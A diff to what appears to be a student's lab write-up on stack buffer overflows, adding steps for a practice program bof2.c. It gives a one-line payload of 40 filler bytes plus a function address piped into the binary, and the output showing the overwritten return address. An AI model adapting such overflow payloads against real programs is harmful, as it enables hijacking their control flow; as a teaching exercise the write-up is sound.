@@ -12,6 +12,17 @@ disables the compiler's stack protection mechanisms, ensures compatibility with 
 - Congratulation! shows that the buffer overflow successfully altered the control flow
 Segmentation fault the program attempts to continue, but the memory structure is corrupted
 
+![{7E60E460-CF05-4A0C-9E9F-565960401398}](https://github.com/user-attachments/assets/0cc52c86-7709-4c7c-9d98-95d51d96e854)
+- Compile bof2.c
+- echo $(python -c "print('a'*40+'\x6b\x84\x04\x08')") | ./bof2.out 1234 creates a string of 40 'a' characters, '\x6b\x84\x04\x08' is the address of the function
+- [buf]: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaak�♦  shows the contents of the buffer, 'a' characters have filled the buffer, followed by the memory address provided
+[check] 0x804846b confirms that the value in the memory location being checked is 0x0804846b  is the address of the function that i want to jump to, confirms that my buffer overflow successfully overwrote the return address or function pointer, and the program is now set to jump to 0x0804846b
+You are on the right way! show that the exploit worked correctly
+
+
+
+
+
 
   
 
